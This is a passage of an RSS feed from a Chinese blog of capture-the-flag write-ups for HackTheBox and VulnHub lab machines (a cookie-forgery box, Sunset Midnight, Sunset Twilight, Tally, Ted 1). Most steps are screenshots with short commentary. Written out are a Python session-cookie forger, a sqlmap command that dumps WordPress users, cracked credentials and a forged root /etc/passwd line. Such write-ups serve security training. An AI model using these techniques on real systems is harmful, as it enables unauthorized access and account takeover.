&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE577cd4ade8a9a13d84ae8618db0b8d31image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;http:&lt;/p&gt;
&lt;p&gt;看起来是个搜索框，可能是sql注入？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc5ccae5df7ad67cbdbab90c92ab5d5c9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;fuzz好像没有：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc4a1d68693754c002aed4f20f59380eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;目录扫描，发现登录框：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE88a7af724c1f43258f48b344870d803cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现很多用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE611c4eb350390e4fbe8373abe6846b4cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;似乎是存放cookie的地方：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE79915e476c56fdc93a82e5f7e8c588b7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时发现，疑似文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb358716131321cf3f726119aac887f51image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;根据报错，看样子是有了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4c50303b32179b578469e85d451c9bffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功读取cookie.php:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7bd0675c4fd79d436654812ca19e2971image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看login.php的源码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe2d9dc38b25f889b59062562bab56330image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;似乎authController.php才是负责身份控制的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE378001e303caa274ed5fed50c7783e12image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现数据文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2903756de18100cc7ab83d37d08408bdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2858bb6f9846a0f08a70ca842e07602dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是不允许登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE75f311313cc9cf369f8e48733673959bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4122ba0229a6bb89cb50f80c35c0c010image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;读取它：&lt;/p&gt;
&lt;p&gt;简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d23778e62cf8f06a5217cbe1a974503image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：&lt;/p&gt;
&lt;p&gt;这里面只需要提供账号名，我们就可以伪造了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE910293850c731e21055e0e151283ddb6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE17b9646a16d87a4a2c5ca7a89b2a938fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import hashlib
import random

def makesession(username):
    max_index = len(username) - 1
    seed = random.randint(0, max_index)
    key = &amp;#34;s4lTy_stR1nG_&amp;#34; + username[seed] + &amp;#34;(!528./9890&amp;#34;
    session_cookie = username + hashlib.md5(key.encode()).hexdigest()

    return session_cookie

# 测试示例
username = &amp;#34;paul&amp;#34;
session_cookie = makesession(username)
print(&amp;#34;Generated Session Cookie:&amp;#34;, session_cookie)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7b9afb35c9b08cf526a1edc1e62bc361image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x036 sunset midnight </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/</guid>
      <description>&lt;p&gt;开机改网卡&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE515c39a3dcd4fcc5ce0480c323d5ffdd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe25f0457757bbefae5bfd634c289321b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb2710c79e4f6c9659dfad6e683bf179f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;修改hosts&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9416f3c413dc69ca81bb6da38cb50b53%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;又是一个wordpress：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc745f8202c3dbe9ee7c7247705308f13%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan扫描一下：&lt;/p&gt;
&lt;p&gt;用户名admin&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9510f37f7c02bcd4a296d91df829154f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;插件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;--enumerate
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc7dca05db1ab1a43e4703a6874d66850%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过查询Simply Poll的历史漏洞发现sql注入：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE51825315e324319d8346b1b8c18c9a0d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE848c7a2d74488032fec7fb2914a8da18%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sqlmap -u &amp;#34;http://sunset-midnight/wp-admin/admin-ajax.php&amp;#34; --data=&amp;#34;action=spAjaxResults&amp;amp;pollid=2&amp;#34; --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcee05cc4df5bc1ee05e20f953efe1863%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：&lt;/p&gt;
&lt;p&gt;找了半天hash生成工具，找到这个网站了&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.useotools.com/wordpress-password-hash-generator/output&#34;&gt;https://www.useotools.com/wordpress-password-hash-generator/output&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcf45a329b9b9f084054046b680c0d714%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe9741833b28b831db0975a086e66aae7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEac1df8d7902946381479d04729d86e47%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2ac5d6bd7c5cd8d5c0df79e71a4d4e55%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解&lt;/p&gt;
&lt;p&gt;root/robert&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0f0829e50053a3c8368b33e58540f079%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ssh连接失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE67d04ecc7aec34c3c8998e5aba5369c5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;还有一个端口3306：&lt;/p&gt;
&lt;p&gt;连接成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE687afab837885aabd4de5814df67218c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再次修改密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0bec078c9a9cba3a798281ce70fdcf68%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x037 Sunset Twilight</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x037-sunset-twilight/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x037-sunset-twilight/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE27f14d745b2f0e154015f2be58cf76f5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4c8e41b066c0f14495d135172bef00b8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEce027da8b90fba789bc868b2012e5a20%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21匿名登录失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5dafc474980e02adf7619137190fd50a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;mysql无密码直接登录成功，翻查敏感信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf2ee80d54fdc3dbbaa97963964ae99e1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不允许写入：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6a8c5f13fef2d9beb6db5a94bd9b5993%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;数据库也没有其他信息了，暂时先放一下，看一下smb，疑似根目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa9d0876f74b9b7eaf03897df23f9975a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;挂载下来，慢慢看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4b78d0f155f7a79208a0410057de6fe4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名：miguel&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE890831d187809ac88f6afee9593be6cb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;翻查敏感目录，发现web目录存在写入权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf87333824f34208bdf6868fdb3c6fe1f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEba201ad6ab6d29cccb526ea14d823f3c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb654ec6d76b7f6148d18325a63e3fbed%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5680adbf5993927db6df3f7bec5129e4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6890ad4950dfe525259db6d1e213e0cb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE251105d444290b22cfac1af86f62116e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;跑完一圈脚本后，咋感觉提权点有点多呢：&lt;/p&gt;
&lt;p&gt;这个密码看起来是破解出来了，咋用不了呢：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE230c38b38c06ef41ce9e30bbda642143%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;算了，用openssl生成一个passwd的密码，然后修改passwd文件，就可以提权了：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;密码Abcd1234&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3bdda34dbb832e5886736c5f9a5e8e08%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEefaa079a7e85e4784a717f16b8e6a634%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb297ae3985c5f010566a23128e848a6d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;邪门儿，我咋先拿了root再拿的用户权限呢，我去看看其他人咋做的&lt;/p&gt;
&lt;p&gt;其他人是web渗透拿到的，但是好像也没去拿用户权限&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7a716d079a4ee49b77241618fb04e6d8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X038 Tally</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x038-tally/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x038-tally/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2e65f32af6430600375a0f308e85fe70image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5bc4aae6d24dbfb004aca4c9548c9cecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1e113e5e44899274a4b48480d7e76007image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5e37c1a6db88c53a1ace675970cd5b08image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务：&lt;/p&gt;
&lt;p&gt;ftp、http、smb、mysql、winrm&lt;/p&gt;
&lt;p&gt;先看ftp:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6ed7e599ecd0488c2e86079a77b99131image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fe345e31db3bdb7cf273e07915c3984image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只能看看http了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE090ee03356170ef55f38ba11bf7f2564image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我扫了半天也没扫出东西来，看了才知道，得用其他字典:&lt;/p&gt;
&lt;p&gt;/usr/share/wordlists/dirb/vulns/sharepoint.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf0bfc009a4a3d09250fd72083120869aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这三个都可以用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7824a383e5e426d8266d5dada79e45dfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEef34adcded028c6e4b5c310e3a0ffdcdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现文档：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEae376517451fc4c05164c1bc4e7ac35dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有密码了，但是好像没名字&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEee5a5b5cb2e5518d45cbd75613e68974image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;先试试，但是失败了，继续信息收集，通过删除#号前面的内容，可以成功看到信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE541055b77ce347ec03309eb5d4f714a6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名为：ftp_user，同时告诉我们一个信息，他们会定时查看htlm文件，在Intranet文件夹中，可能可以钓鱼：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6a08df7416a01876c4308183d3470cdbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE810f2e4a66c0c88cdad0af2af768b61bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf02fd893f94e0bf1dcac3f93def99a68image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;继续信息收集，发现一个keepass软件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1c41a58845ab8cd87721b31604d23358image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个软件好像是个密码保存软件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb74cb4f7fe8e5557ee0657c8fcaba253image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;并且查询后发现存储的密码是可以破解的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8949ce1edca07994e3f46dcd4b958945image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;simplementeyo    (tim)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE41302bbc7352a378dbb7059f2d716cf1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过keepass2读取文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd79827b229c7ced20ad4c600e0997da0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winrm登录失败了，但是成功登录了smb，说实话，东西太多了，这样增加的难度我不是很喜欢：&lt;/p&gt;
&lt;p&gt;在zz_Archived中发现密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe5939a893170acd30b2cbc81bfbb434cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像不对：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe7195889aad737dab014b521ce28e36cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x038 Ted 1  </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x038-ted-1--/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x038-ted-1--/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb3f7bb4145739ba4a03002853350e6e9%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1e8b2fa9f312d6c2337739ee6e16b3ed%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;看样子目录没扫出什么东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE87c835b4b6c5df9ff9f3ea6df4f0b684%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
